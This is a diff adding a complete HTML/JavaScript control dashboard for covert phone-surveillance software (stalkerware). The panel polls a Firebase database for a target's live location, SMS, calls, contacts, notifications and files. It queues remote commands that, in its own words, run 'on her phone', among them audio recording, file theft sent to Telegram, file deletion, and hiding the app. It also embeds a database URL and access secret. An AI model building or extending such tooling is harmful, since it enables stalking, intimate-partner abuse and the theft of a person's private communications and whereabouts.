@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Tracker</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+  body{margin:0;font:14px system-ui;background:#0f1216;color:#e6eaee}
+  header{padding:12px 16px;background:#161b22;position:sticky;top:0;z-index:10}
+  nav button{background:#21262d;color:#e6eaee;border:1px solid #30363d;border-radius:6px;padding:6px 10px;margin-right:6px;font-size:13px}
+  nav button.on{background:#1f6feb;border-color:#1f6feb}
+  main{padding:16px}
+  #map{height:340px;border-radius:8px}
+  table{width:100%;border-collapse:collapse;font-size:12px}
+  td,th{border-bottom:1px solid #22272e;padding:6px;text-align:left;vertical-align:top}
+  .card{background:#161b22;border:1px solid #22272e;border-radius:8px;padding:12px;margin-bottom:12px}
+  input,textarea{background:#0d1117;color:#e6eaee;border:1px solid #30363d;border-radius:6px;padding:8px;width:100%;box-sizing:border-box}
+  .hide{display:none}
+  .mut{color:#8b949e}
+</style>
+</head>
+<body>
+<header>
+  <div style="margin-bottom:8px"><b id="title">Tracker</b> <span class="mut" id="hb"></span></div>
+  <nav>
+    <button class="on" data-t="map">Map</button>
+    <button data-t="files">Files</button>
+    <button data-t="notif">Notifications</button>
+    <button data-t="sms">SMS</button>
+    <button data-t="calls">Calls</button>
+    <button data-t="contacts">Contacts</button>
+    <button data-t="cmd">Commands</button>
+  </nav>
+</header>
+<main>
+
+<div id="map" class="card"></div>
+
+<div id="files" class="hide card">
+  <div class="mut" id="filemeta">loading…</div>
+  <input id="filter" placeholder="filter by name…">
+  <div id="filelist"></div>
+</div>
+
+<div id="notif" class="hide card"><div id="notiflist"></div></div>
+<div id="sms" class="hide card"><div id="smslist"></div></div>
+<div id="calls" class="hide card"><div id="callslist"></div></div>
+<div id="contacts" class="hide card"><div id="contactslist"></div></div>
+
+<div id="cmd" class="hide card">
+  <p class="mut">Type a command and it runs on her phone within 60 seconds.</p>
+  <p><b>ping</b> · <b>locate</b> · <b>rec60</b> · <b>pim</b> · <b>index</b> · <b>log</b><br>
+     <b>ls</b> /storage/emulated/0/DCIM · <b>fetch</b> /full/path.jpg · <b>rm</b> /full/path.jpg<br>
+     <b>hide</b> · <b>show</b></p>
+  <input id="cmdtype" placeholder="command, e.g. locate">
+  <input id="cmdarg" placeholder="argument (optional)">
+  <button id="send" style="margin-top:8px;padding:8px 16px">Send</button>
+  <div id="cmdres" style="margin-top:16px"></div>
+</div>
+
+</main>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+// ============ EDIT THESE TWO LINES ============
+const DB   = "https://tracker-9c0ec-default-rtdb.asia-southeast1.firebasedatabase.app";
+const SEC  = "white-elephant-9348";
+const DEV  = "phone1";
+// ==============================================
+
+const B = `${DB}/${SEC}/dev/${DEV}`;
+const $ = id => document.getElementById(id);
+const esc = s => (s??"").toString().replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+const when = t => t ? new Date(t).toLocaleString() : "";
+const size = b => b>1048576 ? (b/1048576).toFixed(1)+" MB" : (b/1024).toFixed(0)+" KB";
+
+async function j(path){ try{ const r = await fetch(`${B}/${path}.json`); return await r.json(); }catch(e){ return null; } }
+async function put(path,val){ await fetch(`${B}/${path}.json`,{method:"PUT",body:JSON.stringify(val)}); }
+async function del(path){ await fetch(`${B}/${path}.json`,{method:"DELETE"}); }
+
+const map = L.map('map').setView([20,0],2);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19,attribution:'OSM'}).addTo(map);
+let marker=null, first=true;
+
+async function tickMap(){
+  const s = await j("status");
+  if(s){
+    $("hb").textContent = s.ts ? `last seen ${when(s.ts)} · battery ${s.battery??"?"}%${s.charging?" (charging)":""} · ${s.model??""}` : "";
+  }
+  const l = await j("loc");
+  if(l && l.lat){
+    const p=[l.lat,l.lon];
+    if(!marker){ marker=L.marker(p).addTo(map); } else { marker.setLatLng(p); }
+    marker.bindPopup(`${l.lat.toFixed(5)}, ${l.lon.toFixed(5)}<br>${when(l.ts)}<br>±${Math.round(l.acc)}m`);
+    if(first){ map.setView(p,15); first=false; }
+  }
+}
+
+async function tickFiles(){
+  const m = await j("files_meta");
+  $("filemeta").textContent = m ? `${m.count} files indexed · ${when(m.ts)}` : "no index yet (send command: index)";
+  if(!m) return;
+  let all=[];
+  for(let i=0;i<m.chunks;i++){
+    const c = await j(`files/${i}`);
+    if(c) all=all.concat(c);
+  }
+  all.sort((a,b)=>b.m-a.m);
+  const f = $("filter").value.toLowerCase();
+  $("filelist").innerHTML = "<table><tr><th>File</th><th>Size</th><th>Modified</th><th></th></tr>" +
+    all.filter(x=>!f||x.p.toLowerCase().includes(f)).slice(0,400).map(x=>
+      `<tr><td>${esc(x.p)}</td><td>${size(x.s)}</td><td class="mut">${when(x.m)}</td>
+       <td><button onclick="fetchFile('${esc(x.p)}')">get</button></td></tr>`).join("") + "</table>";
+}
+
+async function tickList(node, el, render){
+  const d = await j(node);
+  if(!d){ $(el).innerHTML = '<div class="mut">nothing yet</div>'; return; }
+  const arr = Array.isArray(d) ? d.filter(Boolean) : Object.values(d);
+  arr.sort((a,b)=>(b.ts||b.date||0)-(a.ts||a.date||0));
+  $(el).innerHTML = render(arr.slice(0,300));
+}
+
+async function tickCmd(){
+  const d = await j("cmdres");
+  if(!d) return;
+  const arr = Object.values(d).sort((a,b)=>(b.ts||0)-(a.ts||0)).slice(0,20);
+  $("cmdres").innerHTML = arr.map(x=>`<div class="card"><b>${esc(x.t)}</b> <span class="mut">${when(x.ts)}</span><pre style="white-space:pre-wrap">${esc(x.r)}</pre></div>`).join("");
+}
+
+window.fetchFile = async p => {
+  const id = Date.now().toString(36);
+  await put(`cmd/${id}`, {t:"fetch", a:p});
+  alert("queued. It will land in your Telegram within a minute.");
+};
+
+$("send").onclick = async () => {
+  const t = $("cmdtype").value.trim();
+  if(!t) return;
+  await put(`cmd/${Date.now().toString(36)}`, {t:t, a:$("cmdarg").value.trim()});
+  $("cmdtype").value=""; $("cmdarg").value="";
+};
+
+document.querySelectorAll("nav button").forEach(b=>{
+  b.onclick = () => {
+    document.querySelectorAll("nav button").forEach(x=>x.classList.remove("on"));
+    b.classList.add("on");
+    ["map","files","notif","sms","calls","contacts","cmd"].forEach(id=>$(id).classList.add("hide"));
+    $(b.dataset.t).classList.remove("hide");
+    if(b.dataset.t==="map") setTimeout(()=>map.invalidateSize(),50);
+  };
+});
+
+$("filter").oninput = tickFiles;
+
+setInterval(tickMap, 15000);
+setInterval(tickFiles, 60000);
+setInterval(tickCmd, 15000);
+setInterval(()=>tickList("notif","notiflist",a=>a.map(x=>`<div class="card"><b>${esc(x.title)}</b> <span class="mut">${esc(x.pkg)} · ${when(x.ts)}</span><br>${esc(x.text)}</div>`).join("")), 20000);
+setInterval(()=>tickList("data/sms","smslist",a=>"<table>"+a.map(x=>`<tr><td>${esc(x.addr)}</td><td>${esc(x.body)}</td><td class="mut">${when(x.date)}</td></tr>`).join("")+"</table>"), 60000);
+setInterval(()=>tickList("data/calls","callslist",a=>"<table>"+a.map(x=>`<tr><td>${esc(x.num)}</td><td>${x.type}</td><td>${x.dur}s</td><td class="mut">${when(x.date)}</td></tr>`).join("")+"</table>"), 60000);
+setInterval(()=>tickList("data/contacts","contactslist",a=>"<table>"+a.map(x=>`<tr><td>${esc(x.n)}</td><td>${esc(x.p)}</td></tr>`).join("")+"</table>"), 120000);
+
+tickMap(); tickFiles(); tickCmd();
+</script>
+</body>
+</html>
